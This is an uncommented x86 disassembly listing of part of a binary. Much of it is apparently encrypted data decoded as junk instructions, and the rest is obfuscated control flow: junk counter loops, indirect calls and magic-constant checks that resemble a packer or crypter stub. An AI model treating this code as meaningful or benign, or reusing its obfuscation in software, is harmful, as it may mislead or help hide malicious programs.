  407c12:	add    edx,DWORD PTR ds:0x433757
  407c18:	dec    edx
  407c19:	mov    DWORD PTR ds:0x433757,edx
  407c1f:	mov    edx,DWORD PTR ds:0x433757
  407c25:	dec    edx
  407c26:	mov    DWORD PTR ds:0x433757,edx
  407c2c:	jmp    0x407bd9
  407c31:	mov    edx,DWORD PTR [eax]
  407c33:	imul   edx,edx,0xf89ea9ee
  407c39:	jmp    0x407e61
  407c3e:	and    BYTE PTR [edi-0x2b],al
  407c41:	out    0x71,al
  407c43:	je     0x407c76
  407c45:	inc    ecx
  407c46:	adc    al,0x2f
  407c48:	sbb    ecx,esi
  407c4a:	in     eax,dx
  407c4b:	shr    bl,0x30
  407c4e:	sub    ecx,esp
  407c50:	jle    0x407cd0
  407c52:	add    eax,0xb47e7e7c
  407c57:	mov    ah,0xea
  407c59:	ret    
  407c5a:	loop   0x407ca2
  407c5c:	xchg   ecx,eax
  407c5d:	adc    bl,BYTE PTR [edx]
  407c5f:	push   ebx
  407c60:	popf   
  407c61:	test   al,0xff
  407c63:	mov    WORD PTR [edi+0x2a],ds
  407c66:	mov    es,ebx
  407c68:	xor    ebp,DWORD PTR [ebx]
  407c6a:	outs   dx,BYTE PTR ds:[esi]
  407c6b:	xor    al,0x9d
  407c6d:	fs ds (bad) 
  407c70:	shl    esi,cl
  407c72:	loopne 0x407c15
  407c74:	test   BYTE PTR [esi+ebp*4+0x54b157ec],0x6c
  407c7c:	loop   0x407ca2
  407c7e:	test   eax,0x644457f9
  407c83:	pop    edi
  407c84:	pop    esi
  407c85:	pop    esp
  407c86:	xchg   edx,eax
  407c87:	(bad)  
  407c88:	(bad)  
  407c89:	iret   
  407c8a:	std    
  407c8b:	or     BYTE PTR [edx+0x41fd4d0c],cl
  407c91:	mov    ah,0xca
  407c93:	out    0x45,al
  407c95:	push   ecx
  407c96:	jmp    0xf6081ee7
  407c9b:	push   es
  407c9c:	inc    ebp
  407c9d:	mov    bl,0x1f
  407c9f:	fbld   TBYTE PTR [ecx-0x29614e41]
  407ca5:	fs retf 
  407ca7:	push   edi
  407ca8:	repz fdiv st(1),st
  407cab:	jo     0x407cdd
  407cad:	push   eax
  407cae:	xchg   DWORD PTR [edi],edi
  407cb0:	xchg   esp,eax
  407cb1:	punpcklwd mm0,DWORD PTR [esi-0x4]
  407cb5:	jmp    0x407c57
  407cb7:	sar    DWORD PTR [ecx],cl
  407cb9:	in     al,0x33
  407cbb:	in     al,dx
  407cbc:	dec    edi
  407cbd:	retf   
  407cbe:	test   al,0xf6
  407cc0:	stos   DWORD PTR es:[edi],eax
  407cc1:	dec    ecx
  407cc2:	xor    bh,BYTE PTR [ecx]
  407cc4:	loope  0x407c51
  407cc6:	inc    edx
  407cc7:	sub    DWORD PTR [eax-0x2b],edi
  407cca:	pop    ds
  407ccb:	push   ebx
  407ccc:	xchg   esp,eax
  407ccd:	mov    dl,0xc
  407ccf:	jnp    0x407d32
  407cd1:	pop    edi
  407cd2:	hlt    
  407cd3:	add    esi,edi
  407cd5:	push   0x5afc69c8
  407cda:	bound  edx,QWORD PTR [esi-0x4e9070b]
  407ce0:	stos   BYTE PTR es:[edi],al
  407ce1:	cmp    eax,0x239abf7f
  407ce6:	pop    ebx
  407ce7:	inc    edx
  407ce8:	adc    eax,esp
  407cea:	cmp    DWORD PTR [ecx],0xffffffca
  407ced:	mov    ebx,0x6b42c5c3
  407cf2:	pop    esp
  407cf3:	addr16 jl 0x407d72
  407cf6:	arpl   WORD PTR [eax+0x71],bx
  407cf9:	adc    al,0x29
  407cfb:	sbb    ebp,DWORD PTR [edx+0x71]
  407cfe:	lock add BYTE PTR [edi-0xd5f4233],dl
  407d05:	push   ebp
  407d06:	add    DWORD PTR [ebx-0x50ea4cb0],esp
  407d0c:	add    edx,DWORD PTR [ecx+0x17]
  407d0f:	jns    0x407cef
  407d11:	pusha  
  407d12:	sub    DWORD PTR [ecx+0x6e8099fd],0xffffffe8
  407d19:	sbb    al,0x44
  407d1b:	sub    ecx,ebx
  407d1d:	mov    ds:0x6088f1d5,eax
  407d22:	pushf  
  407d23:	cli    
  407d24:	scas   eax,DWORD PTR es:[edi]
  407d25:	xor    cl,0xde
  407d28:	fist   WORD PTR [esi+0x4ad1f24a]
  407d2e:	mov    edi,0x472b6d4d
  407d33:	scas   eax,DWORD PTR es:[edi]
  407d34:	and    eax,0xe32f2e25
  407d39:	adc    edx,DWORD PTR [eax+0x35]
  407d3c:	fs jecxz 0x407d1e
  407d3f:	aad    0x1e
  407d41:	jnp    0x407d74
  407d43:	push   ds
  407d44:	in     eax,dx
  407d45:	outs   dx,BYTE PTR ds:[esi]
  407d46:	in     al,dx
  407d47:	(bad)  
  407d48:	outs   dx,BYTE PTR ds:[esi]
  407d49:	xor    esp,DWORD PTR [edx+0x5a]
  407d4c:	sub    ecx,DWORD PTR [ecx-0x4d]
  407d4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407d50:	in     al,dx
  407d51:	out    0x1e,eax
  407d53:	imul   edi,ecx,0xab92bcb5
  407d59:	scas   eax,DWORD PTR es:[edi]
  407d5a:	cmp    ecx,DWORD PTR ds:[ebx-0x13fd7ad6]
  407d61:	sub    cl,cl
  407d63:	inc    ecx
  407d64:	mov    esi,0xc2582c47
  407d69:	pop    esi
  407d6a:	pop    eax
  407d6b:	push   cs
  407d6c:	jae    0x407cf3
  407d6e:	fstp   st(6)
  407d70:	or     ebx,DWORD PTR [eax+esi*2]
  407d73:	addr16 cmc 
  407d75:	sbb    DWORD PTR [edx-0x68b651fb],edx
  407d7b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d7c:	dec    edi
  407d7d:	ds jp  0x407de8
  407d80:	dec    eax
  407d81:	scas   eax,DWORD PTR es:[edi]
  407d82:	pop    esp
  407d83:	ds pop edi
  407d85:	sub    bl,dl
  407d87:	das    
  407d88:	in     al,0x9d
  407d8a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407d8b:	outs   dx,BYTE PTR ds:[esi]
  407d8c:	mov    al,ds:0x8afece69
  407d91:	neg    DWORD PTR [eax+0x28dcdc8]
  407d97:	les    ebp,FWORD PTR [esi+0x51]
  407d9a:	and    esi,DWORD PTR [edx*4-0x38232cae]
  407da1:	cmp    bl,BYTE PTR [esi+eiz*8-0x5386d091]
  407da8:	lea    ecx,[edx+0x17628e32]
  407dae:	call   0xf904:0xe04ce2cc
  407db5:	cmc    
  407db6:	iret   
  407db7:	mov    dh,0x9b
  407db9:	enter  0xe9,0x29
  407dbd:	sbb    eax,0xbb9109bc
  407dc2:	out    dx,al
  407dc3:	xor    ebp,edx
  407dc5:	cmp    dl,BYTE PTR [esi]
  407dc7:	push   es
  407dc8:	and    dl,BYTE PTR [ebp-0x22d189ac]
  407dce:	pop    ss
  407dcf:	loop   0x407dc2
  407dd1:	pop    esp
  407dd2:	test   BYTE PTR [edi-0x575dfb64],dl
  407dd8:	or     esp,edi
  407dda:	push   cs
  407ddb:	ret    0x2bbf
  407dde:	sbb    BYTE PTR ds:0xe4f53ea4,bh
  407de4:	retf   0x39d1
  407de7:	mov    ebx,0x53af5839
  407dec:	mov    al,ds:0x60616152
  407df1:	std    
  407df2:	jp     0x407db5
  407df4:	pop    esp
  407df5:	mov    esi,0x2ca3b13
  407dfa:	sti    
  407dfb:	xchg   esp,eax
  407dfc:	jne    0x407e51
  407dfe:	push   ecx
  407dff:	cmp    DWORD PTR ds:0x73ab1b34,ebp
  407e05:	mov    al,ds:0xd20acb30
  407e0a:	xor    esp,DWORD PTR [ebp-0x32]
  407e0d:	(bad)  
  407e0e:	fisubr WORD PTR ds:0x4f30e8b9
  407e14:	adc    eax,0x134e8aa6
  407e19:	mov    BYTE PTR [esp+edi*4],0xd1
  407e1d:	imul   esp,eax,0x3d
  407e20:	mov    dh,0x1
  407e22:	mov    al,0x18
  407e24:	and    esp,ebp
  407e26:	nop
  407e27:	ins    DWORD PTR es:[edi],dx
  407e28:	mov    bh,0x41
  407e2a:	dec    ecx
  407e2b:	pusha  
  407e2c:	fdiv   QWORD PTR [ebx+0x3e]
  407e2f:	and    eax,0xaf37a36d
  407e34:	add    eax,edi
  407e36:	stos   BYTE PTR es:[edi],al
  407e37:	outs   dx,DWORD PTR ds:[esi]
  407e38:	jb     0x407e4c
  407e3a:	loop   0x407e65
  407e3c:	push   esi
  407e3d:	jmp    0x407e8f
  407e3f:	not    BYTE PTR [ecx+ecx*1-0x4b]
  407e43:	loope  0x407e98
  407e45:	xchg   esi,eax
  407e46:	mov    WORD PTR [edx-0x32],es
  407e49:	jbe    0x407ddd
  407e4b:	(bad)  [esi+0x19]
  407e4e:	adc    BYTE PTR [esi],cl
  407e50:	add    ebx,ebp
  407e52:	xor    cl,ah
  407e54:	jge    0x407e6f
  407e56:	shl    ebx,cl
  407e58:	call   0x5b4:0x9273bc15
  407e5f:	mov    fs,WORD PTR [ecx-0x77]
  407e62:	adc    BYTE PTR [ebx-0xdc20bbb],cl
  407e68:	and    DWORD PTR [edi],esi
  407e6a:	or     BYTE PTR [edi],0x84
  407e6d:	pop    ss
  407e6e:	add    BYTE PTR [eax],al
  407e70:	add    BYTE PTR [ebx+0x881e445],cl
  407e76:	sahf   
  407e77:	sbb    al,0x75
  407e79:	pusha  
  407e7a:	mov    eax,DWORD PTR [ebp-0x8]
  407e7d:	xor    eax,ecx
  407e7f:	add    eax,esi
  407e81:	pop    edi
  407e82:	pop    esi
  407e83:	pop    ebx
  407e84:	leave  
  407e85:	ret    0x4
  407e88:	mov    eax,DWORD PTR [ebp-0xc]
  407e8b:	add    eax,DWORD PTR [ebp-0x18]
  407e8e:	cmp    eax,0x7ad64f9b
  407e93:	je     0x407ea7
  407e99:	mov    eax,DWORD PTR [ebp-0x10]
  407e9c:	and    DWORD PTR [eax],0x751c99
  407ea2:	jmp    0x407e7a
  407ea7:	mov    eax,DWORD PTR [ebp-0xc]
  407eaa:	mov    edx,DWORD PTR [ebp-0x18]
  407ead:	or     eax,edx
  407eaf:	cmp    eax,0xfabf2dfb
  407eb4:	je     0x407ec8
  407eba:	mov    eax,DWORD PTR [ebp-0x10]
  407ebd:	xor    DWORD PTR [eax],0x2650fa8f
  407ec3:	jmp    0x407e7a
  407ec8:	mov    ax,WORD PTR [ebp-0x4]
  407ecc:	mov    edi,DWORD PTR [ebp+0x8]
  407ecf:	mov    edi,DWORD PTR [edi]
  407ed1:	mov    edx,0x8a3c
  407ed6:	xor    ax,dx
  407ed9:	mov    edx,0x3b02
  407ede:	add    ax,dx
  407ee1:	cmp    ax,WORD PTR [edi]
  407ee4:	je     0x407f31
  407eea:	mov    eax,DWORD PTR [ebp-0x14]
  407eed:	xor    eax,ecx
  407eef:	add    eax,esi
  407ef1:	mov    DWORD PTR [ebp-0x24],eax
  407ef4:	mov    eax,DWORD PTR [ebp-0x28]
  407ef7:	mov    di,WORD PTR [ebp-0x2c]
  407efb:	mov    ebx,0x8a3c
  407f00:	xor    di,bx
  407f03:	add    di,dx
  407f06:	movzx  edx,di
  407f09:	mov    edi,DWORD PTR [ebp-0x8]
  407f0c:	xor    edi,ecx
  407f0e:	lea    edx,[edx+edi*1+0x32729b]
  407f15:	add    DWORD PTR [eax],edx
  407f17:	mov    eax,DWORD PTR [ebp-0x20]
  407f1a:	mov    edx,DWORD PTR [ebp-0x8]
  407f1d:	mov    edi,DWORD PTR [ebp-0x24]
  407f20:	xor    edx,ecx
  407f22:	add    edx,esi
  407f24:	imul   edx,edi
  407f27:	sub    DWORD PTR [eax],edx
  407f29:	mov    eax,DWORD PTR [ebp-0x14]
  407f2c:	jmp    0x407e7d
  407f31:	mov    eax,DWORD PTR [ebp-0xc]
  407f34:	mov    edx,DWORD PTR [ebp-0x18]
  407f37:	xor    eax,edx
  407f39:	cmp    eax,0x7aa80c5b
  407f3e:	je     0x407e7a
  407f44:	mov    eax,DWORD PTR [ebp-0x10]
  407f47:	add    DWORD PTR [eax],0x7403501
  407f4d:	jmp    0x407e7a
  407f52:	mov    eax,DWORD PTR [ebp-0x1c]
  407f55:	cmp    DWORD PTR [eax],edi
  407f57:	je     0x407e7a
  407f5d:	mov    eax,0x800f1c9a
  407f62:	jmp    0x407e81
  407f67:	push   ebp
  407f68:	mov    ebp,esp
  407f6a:	sub    esp,0x20
  407f6d:	adc    ecx,eax
  407f6f:	mov    eax,ds:0x413b34
  407f74:	mov    eax,DWORD PTR [eax+0x198]
  407f7a:	movzx  ecx,BYTE PTR ds:0x43376b
  407f81:	or     DWORD PTR ds:0x43376f,ecx
  407f87:	mov    DWORD PTR [ebp-0x8],eax
  407f8a:	or     DWORD PTR ds:0x4337d7,0x6995
  407f94:	mov    eax,DWORD PTR [ebp+0x8]
  407f97:	mov    ecx,DWORD PTR [ebp-0x8]
  407f9a:	or     DWORD PTR ds:0x4337d3,0x2a5
  407fa4:	push   ebx
  407fa5:	xor    ebx,ebx
  407fa7:	xor    ebx,DWORD PTR ds:0x43381b
  407fad:	sub    DWORD PTR ds:0x4337a7,ebx
  407fb3:	push   esi
  407fb4:	mov    esi,0x7510854
  407fb9:	sub    ebx,DWORD PTR ds:0x43375b
  407fbf:	xor    eax,esi
  407fc1:	and    DWORD PTR ds:0x4337ab,0x0
  407fcb:	jmp    0x407fdd
  407fd0:	mov    ebx,DWORD PTR ds:0x4337ab
  407fd6:	inc    ebx
  407fd7:	mov    DWORD PTR ds:0x4337ab,ebx
  407fdd:	cmp    DWORD PTR ds:0x4337ab,0x17
  407fe4:	jae    0x408024
  407fea:	cmp    DWORD PTR ds:0x4337ab,0x7
  407ff1:	jne    0x408005
  407ff7:	push   0x4339e7
  407ffc:	push   DWORD PTR [ebp-0x10]
  407fff:	call   DWORD PTR ds:0x4120d4
  408005:	cmp    DWORD PTR ds:0x4337ab,0x6
  40800c:	jne    0x40801f
  408012:	mov    ebx,DWORD PTR ds:0x4337ab
  408018:	inc    ebx
  408019:	mov    DWORD PTR ds:0x4337ab,ebx
  40801f:	jmp    0x407fd0
  408024:	push   edi
  408025:	neg    ebx
  408027:	mov    edi,0x32729b
  40802c:	and    DWORD PTR ds:0x4337ab,0x0
  408036:	jmp    0x408048
  40803b:	mov    ebx,DWORD PTR ds:0x4337ab
  408041:	inc    ebx
  408042:	mov    DWORD PTR ds:0x4337ab,ebx
  408048:	cmp    DWORD PTR ds:0x4337ab,0x1c
  40804f:	jae    0x408092
  408055:	cmp    DWORD PTR ds:0x4337ab,0x9
  40805c:	jne    0x40806d
  408062:	push   0x214e
  408067:	call   DWORD PTR ds:0x4122a0
  40806d:	cmp    DWORD PTR ds:0x4337ab,0x8
  408074:	jne    0x408087
  40807a:	mov    ebx,DWORD PTR ds:0x4337ab
  408080:	inc    ebx
  408081:	mov    DWORD PTR ds:0x4337ab,ebx
  408087:	jmp    0x40803b
  40808c:	sub    ebx,0x76f3
  408092:	add    eax,edi
  408094:	mov    DWORD PTR [ecx],eax
  408096:	add    DWORD PTR ds:0x4336fb,0x1c72
  4080a0:	lea    eax,[ebp-0x4]
  4080a3:	not    ebx
  4080a5:	mov    DWORD PTR [ebp-0x10],eax
  4080a8:	mov    eax,DWORD PTR [ebp+0x8]
  4080ab:	mov    ebx,DWORD PTR ds:0x4337db
  4080b1:	and    DWORD PTR ds:0x4337e3,ebx
  4080b7:	mov    ecx,DWORD PTR [ebp-0x10]
  4080ba:	and    DWORD PTR ds:0x43379b,0x5cf4
  4080c4:	xor    eax,esi
  4080c6:	add    eax,edi
  4080c8:	mov    DWORD PTR [ecx],eax
  4080ca:	and    DWORD PTR ds:0x433823,0x0
  4080d4:	xor    ebx,ebx
  4080d6:	or     ebx,DWORD PTR ds:0x433823
  4080dc:	inc    ebx
  4080dd:	mov    DWORD PTR ds:0x433823,ebx
  4080e3:	cmp    DWORD PTR ds:0x433823,0x8
  4080ea:	jne    0x408101
  4080f0:	push   DWORD PTR [ebp-0x10]
  4080f3:	push   0x4337db
  4080f8:	push   DWORD PTR [ebp-0x1c]
  4080fb:	call   DWORD PTR ds:0x412350
  408101:	cmp    DWORD PTR ds:0x433823,0x7
  408108:	jne    0x40811d
  40810e:	xor    ebx,ebx
  408110:	add    ebx,DWORD PTR ds:0x433823
  408116:	inc    ebx
  408117:	mov    DWORD PTR ds:0x433823,ebx
  40811d:	cmp    DWORD PTR ds:0x433823,0x1a
  408124:	jb     0x4080d4
  40812a:	mov    DWORD PTR [ebp-0x14],0xf89c8531
  408131:	mov    DWORD PTR ds:0x433817,0x1f
  40813b:	cmp    DWORD PTR ds:0x433817,0x0
  408142:	je     0x40817a
  408148:	cmp    DWORD PTR ds:0x433817,0x23
  40814f:	jne    0x408168
  408155:	push   DWORD PTR [ebp-0x1c]
  408158:	push   0x3614
  40815d:	push   0x7
  40815f:	push   DWORD PTR [ebp-0xc]
  408162:	call   DWORD PTR ds:0x4120d8
  408168:	mov    ecx,DWORD PTR ds:0x433817
  40816e:	dec    ecx
  40816f:	mov    DWORD PTR ds:0x433817,ecx
  408175:	jmp    0x40813b
  40817a:	lea    eax,[ebp-0x14]
  40817d:	jmp    0x4083c4
  408182:	ss xor esi,ebp
  408185:	lods   eax,DWORD PTR ds:[esi]
  408186:	jmp    0xc3f1f6fc
  40818b:	push   es
  40818c:	mov    ebp,0x775d6a0d
  408191:	fs ds retf 0x7e7e
  408196:	and    al,0x7c
  408198:	jle    0x408218
  40819a:	cmp    ebp,ebx
  40819c:	jns    0x40817d
  40819e:	mov    ebp,0xd5c6250a
  4081a3:	call   0x8d26:0xf6670fcb
  4081aa:	lds    esi,FWORD PTR [esi+eax*8+0x66c0a88d]
  4081b1:	lods   al,BYTE PTR ds:[esi]
  4081b2:	adc    cl,BYTE PTR [eax]
  4081b4:	xchg   ebp,eax
  4081b5:	fcom   DWORD PTR [esi+0x4e300243]
  4081bb:	adc    DWORD PTR [edi],edx
  4081bd:	mov    al,ds:0xb0cca7f0
  4081c2:	add    ebp,ebx
  4081c4:	xor    eax,0x20290126
  4081c9:	js     0x4081e8
  4081cb:	push   ebp
  4081cc:	dec    ebp
  4081cd:	mov    ds:0x822bdf68,al
  4081d2:	push   0x2f5b9201
  4081d7:	fidiv  DWORD PTR [edi-0x2d]
  4081da:	in     al,0x2d
  4081dc:	das    
  4081dd:	ret    0x89a2
  4081e0:	call   0x626e:0xc1c0e233
  4081e7:	out    0x29,al
  4081e9:	adc    dl,BYTE PTR [ebx]
  4081eb:	outs   dx,BYTE PTR ds:[esi]
  4081ec:	mov    ecx,DWORD PTR [ecx+0x6a219b1e]
  4081f2:	retf   0x12d9
  4081f5:	or     al,0x4b
  4081f7:	lods   eax,DWORD PTR ds:[esi]
  4081f8:	ror    DWORD PTR [eax-0x53],cl
  4081fb:	mov    DWORD PTR [eax+eax*8],esp
  4081fe:	repz cmc 
  408200:	add    al,0xae
  408202:	xor    eax,0xc663a11c
  408207:	adc    al,BYTE PTR [ebp-0x5e]
  40820a:	nop
  40820b:	push   eax
  40820c:	leave  
  40820d:	jmp    0x7476:0xeae0a673
  408214:	(bad)  
  408215:	mov    ch,0x0
  408217:	cmp    bh,bh
  408219:	xor    al,0xd
  40821b:	scas   eax,DWORD PTR es:[edi]
  40821c:	repz test eax,0x899fd3e6
  408222:	jne    0x40820b
  408224:	dec    edx
  408225:	xchg   esp,eax
  408226:	adc    eax,0x1152aed8
  40822b:	push   edi
  40822c:	fiadd  WORD PTR [ecx]
  40822e:	jae    0x408242
  408230:	mov    cl,ch
  408232:	shl    ecx,cl
  408234:	adc    DWORD PTR [ecx],ebp
  408236:	pop    esi
  408237:	adc    DWORD PTR [ebp-0x34],eax
  40823a:	jbe    0x408297
  40823c:	outs   dx,BYTE PTR ds:[esi]
  40823d:	(bad)  
  40823e:	dec    edx
  40823f:	jns    0x4081d0
  408241:	dec    edi
  408242:	push   0x17055526
  408247:	retf   0x1ce
  40824a:	push   esp
  40824b:	mov    ds:0xd26644b0,eax
  408250:	add    al,0x79
  408252:	ret    0x6ef2
  408255:	scas   eax,DWORD PTR es:[edi]
  408256:	or     eax,DWORD PTR [eax]
  408258:	jecxz  0x40829f
  40825a:	fbstp  TBYTE PTR [ebx+eiz*8]
  40825d:	inc    esp
  40825e:	adc    DWORD PTR [esi+0x9],eax
  408261:	and    al,0x7f
  408263:	neg    DWORD PTR [ecx+0x11bcef04]
  408269:	(bad)  
  40826a:	adc    al,0x93
  40826c:	xchg   esi,eax
  40826d:	or     BYTE PTR [esi-0x40],ah
  408270:	pop    edi
  408271:	sub    BYTE PTR [edi],cl
  408273:	vpsravd zmm2{k6},zmm6,DWORD PTR [ebp+0x16c]{1to16}
  40827a:	sahf   
  40827b:	and    eax,0x43d16579
  408280:	arpl   WORD PTR [esi+0x5689e64e],di
  408286:	enter  0xcb10,0x3
  40828a:	cdq    
  40828b:	stos   DWORD PTR es:[di],eax
  40828d:	lods   eax,DWORD PTR ds:[esi]
  40828e:	inc    edx
  40828f:	add    dl,ch
  408291:	jno    0x408287
  408293:	pop    es
  408294:	pop    ss
  408295:	rcl    BYTE PTR [ebx],0x32
  408298:	addr16 jmp 0x4082b3
  40829b:	sub    DWORD PTR ds:0xbb0ec488,0x772f5814
  4082a5:	pop    edx
  4082a6:	sbb    al,0x5f
  4082a8:	ins    BYTE PTR es:[edi],dx
  4082a9:	out    dx,eax
  4082aa:	ficomp DWORD PTR [ebx-0x6a]
  4082ad:	jb     0x4082fb
  4082af:	call   0xd6968205
  4082b4:	add    DWORD PTR [ebx+0x1bb8a033],edi
  4082ba:	ficomp DWORD PTR ss:[edi]
  4082bd:	xor    bl,al
  4082bf:	sbb    dl,BYTE PTR ds:0x733c28d8
  4082c5:	shl    BYTE PTR [ebx+0x4f],1
  4082c8:	inc    ebx
  4082c9:	scas   al,BYTE PTR es:[edi]
  4082ca:	cwde   
  4082cb:	fwait
  4082cc:	test   edx,ebx
  4082ce:	js     0x40825a
  4082d0:	xor    eax,DWORD PTR [ecx+edx*4+0x73]
  4082d4:	je     0x408346
  4082d6:	pushf  
  4082d7:	xchg   edi,eax
  4082d8:	out    dx,eax
  4082d9:	pop    ebx
  4082da:	cmp    DWORD PTR [edx-0x79],edi
  4082dd:	xchg   ebp,ebp
  4082df:	outs   dx,BYTE PTR ds:[esi]
  4082e0:	xchg   esp,eax
  4082e1:	and    al,bl
  4082e3:	xchg   edi,eax
  4082e4:	(bad)  
  4082e5:	sub    al,0xc0
  4082e7:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4082e8:	push   ecx
  4082e9:	cld    
  4082ea:	cmp    ebx,0x2ee36b2b
  4082f0:	fidiv  DWORD PTR [edx]
  4082f2:	out    dx,eax
  4082f3:	shl    BYTE PTR [edx],1
  4082f5:	jge    0x408316
  4082f7:	sub    eax,0x4cbc034f
  4082fc:	xchg   ecx,eax
  4082fd:	jb     0x408317
  4082ff:	lock mov cl,0x45
  408302:	dec    ebx
  408303:	fisub  DWORD PTR [ebp*1-0x595925e3]
  40830a:	push   ebp
  40830b:	xchg   BYTE PTR [edx],dl
  40830d:	add    bl,ah
  40830f:	fs mov ebp,0x98c0351b
  408315:	cmp    al,0x61
  408317:	(bad)  
  408318:	pop    ecx
  408319:	push   ebx
  40831a:	jne    0x4082f7
  40831c:	add    esi,eax
  40831e:	stos   DWORD PTR es:[edi],eax
  40831f:	scas   eax,DWORD PTR es:[edi]
  408320:	pop    esi
  408321:	push   ebp
  408322:	outs   dx,BYTE PTR ds:[esi]
  408323:	fcom   QWORD PTR [edx]
  408325:	adc    esp,ebx
  408327:	out    dx,al
  408328:	ins    DWORD PTR es:[edi],dx
  408329:	shl    BYTE PTR [eax],0x8
  40832c:	and    DWORD PTR [edx-0x44e54673],ebx
  408332:	push   ecx
  408333:	or     ebx,DWORD PTR [eax]
  408335:	(bad)  
  408336:	or     eax,0xc66beece
  40833b:	push   ebx
  40833c:	or     al,BYTE PTR [ebx]
  40833e:	xor    al,0xee
  408340:	inc    ecx
  408341:	inc    eax
  408342:	xor    DWORD PTR [edi],esp
  408344:	mov    WORD PTR [ebp-0x3c2c1386],?
  40834a:	test   al,0x5c
  40834c:	xor    BYTE PTR [esi],ah
  40834e:	into   
  40834f:	inc    ecx
  408350:	loope  0x4082d4
  408352:	les    ebp,FWORD PTR [ecx-0x66fefc99]
  408358:	aaa    
  408359:	call   0x1581:0x263c7e9d
  408360:	mov    ch,0xd4
  408362:	out    dx,al
  408363:	jb     0x408356
  408365:	sbb    ebp,DWORD PTR [esi]
  408367:	pop    edi
  408368:	jle    0x40833b
  40836a:	in     eax,0x9f
  40836c:	mov    WORD PTR [edx],cs
  40836e:	aad    0xfd
  408370:	inc    ecx
  408371:	adc    cl,bl
  408373:	hlt    
  408374:	repz cmp al,0xfe
  408377:	inc    ebp
  408378:	sets   BYTE PTR [ebp+0x5908e3a1]
  40837f:	retf   
  408380:	into   
  408381:	xor    al,0x59
  408383:	xor    edx,esp
  408385:	mov    ch,0x65
  408387:	cmp    dh,BYTE PTR [eax]
  408389:	and    DWORD PTR [edx-0x40],edx
  40838c:	adc    DWORD PTR [ebp+0x6fcb69b6],0xffffffd3
  408393:	sbb    al,0xe7
  408395:	dec    ebp
  408396:	mov    edx,0x7104e7d9
  40839b:	lsl    ebx,WORD PTR [ebp+0x7555247b]
  4083a2:	fsubr  st,st(1)
  4083a4:	add    BYTE PTR [edi+0x23fdb5ee],cl
  4083aa:	adc    bh,BYTE PTR [edx+0x67]
  4083ad:	pop    edi
  4083ae:	jnp    0x40837a
  4083b0:	inc    ecx
  4083b1:	ret    0xa1a5
  4083b4:	or     eax,0xb2dde522
  4083b9:	cmp    ebp,DWORD PTR [ecx-0xc]
  4083bc:	sbb    al,BYTE PTR [edx]
  4083be:	mov    al,0x1e
  4083c0:	cs fucomip st,st(6)
  4083c3:	retf   
  4083c4:	mov    DWORD PTR [ebp-0x20],eax
  4083c7:	and    DWORD PTR ds:0x43375b,0x0
  4083d1:	mov    eax,ds:0x43375b
  4083d6:	inc    eax
  4083d7:	mov    ds:0x43375b,eax
  4083dc:	cmp    DWORD PTR ds:0x43375b,0x6
  4083e3:	jne    0x4083f7
  4083e9:	push   DWORD PTR [ebp-0x20]
  4083ec:	push   0x3975
  4083f1:	call   DWORD PTR ds:0x412354
  4083f7:	cmp    DWORD PTR ds:0x43375b,0x5
  4083fe:	jne    0x408412
  408404:	xor    eax,eax
  408406:	or     eax,DWORD PTR ds:0x43375b
  40840c:	inc    eax
  40840d:	mov    ds:0x43375b,eax
  408412:	cmp    DWORD PTR ds:0x43375b,0x19
  408419:	jb     0x4083d1
  40841f:	inc    ebx
  408420:	mov    eax,DWORD PTR [ebp-0x14]
  408423:	or     DWORD PTR ds:0x43370b,0x6df5
  40842d:	mov    ecx,DWORD PTR [ebp-0x20]
  408430:	xor    ebx,0x4a96
  408436:	xor    eax,esi
  408438:	add    ebx,0x7cb
  40843e:	add    eax,edi
  408440:	xor    DWORD PTR ds:0x433713,ecx
  408446:	mov    DWORD PTR [ecx],eax
  408448:	mov    eax,ds:0x413c08
  40844d:	adc    ebx,DWORD PTR ds:0x433827
  408453:	jmp    0x40869a
  408458:	xchg   BYTE PTR [ebp-0x19],bl
  40845b:	inc    ebx
  40845c:	in     eax,0x41
  40845e:	mov    ds:0x7a26859,al
  408463:	das    
  408464:	xchg   DWORD PTR ss:[edx+eiz*8],edx
  408468:	in     al,0xc8
  40846a:	jle    0x4084ea
  40846c:	and    al,0x7c
  40846e:	jle    0x4084ee
  408470:	add    al,0x76
  408472:	addr16 clc 
  408474:	xchg   BYTE PTR [esi+0x51a4540],bl
  40847a:	call   0x918d:0x4f86df87
  408481:	mov    DWORD PTR [ebx+ebp*8-0x37],0x7743743b
  408489:	and    DWORD PTR [ecx],ebp
  40848b:	adc    ah,BYTE PTR [edx-0x42822d42]
  408491:	or     esp,DWORD PTR [edi]
  408493:	xchg   edx,esi
  408495:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408496:	fwait
  408497:	xchg   edi,eax
  408498:	rcl    BYTE PTR [ecx+0x323027ad],1
  40849e:	jmp    0x7510:0x2cefdfa9
  4084a5:	int    0x36
  4084a7:	push   0xa0e3abfc
  4084ac:	jecxz  0x4084e1
  4084ae:	jmp    0xaa9cc461
  4084b3:	push   ebp
  4084b4:	cmc    
  4084b5:	pop    ebp
  4084b6:	loope  0x4084e9
  4084b8:	mov    bh,0x78
  4084ba:	xor    DWORD PTR [ebx+0x32a710e8],edx
  4084c0:	xchg   ax,ax
  4084c2:	mov    ebp,0xc7c7d768
  4084c7:	test   al,0xfb
  4084c9:	test   DWORD PTR [ebp-0x6d1e1f32],esp
  4084cf:	fwait
  4084d0:	xchg   esp,eax
  4084d1:	mov    eax,0xba90127b
  4084d6:	(bad)  
  4084d7:	mov    edi,0x7e0fc5db
  4084dc:	addr16 xor ch,ah
  4084df:	(bad)  
  4084e0:	cld    
  4084e1:	sbb    al,0x11
  4084e3:	pop    ebp
  4084e4:	jecxz  0x40850c
  4084e6:	bound  ecx,QWORD PTR [esi+eiz*2-0x646a3787]
  4084ed:	mov    cl,0xb8
  4084ef:	add    BYTE PTR [edx+0x4f],0x88
  4084f3:	pop    ebp
  4084f4:	pop    ss
  4084f5:	adc    ch,ah
  4084f7:	jmp    0x4084c3
  4084f9:	xchg   edx,eax
  4084fa:	test   BYTE PTR [edx+ebp*2],dh
  4084fd:	add    bl,al
  4084ff:	inc    esi
  408500:	(bad)  
  408502:	or     BYTE PTR [esi],ah
  408504:	xor    al,0x59
  408506:	(bad)  
  408507:	in     al,dx
  408508:	xchg   esi,eax
  408509:	mov    ebx,0x85b8c2b8
  40850e:	mov    ebx,0x8c5f8443
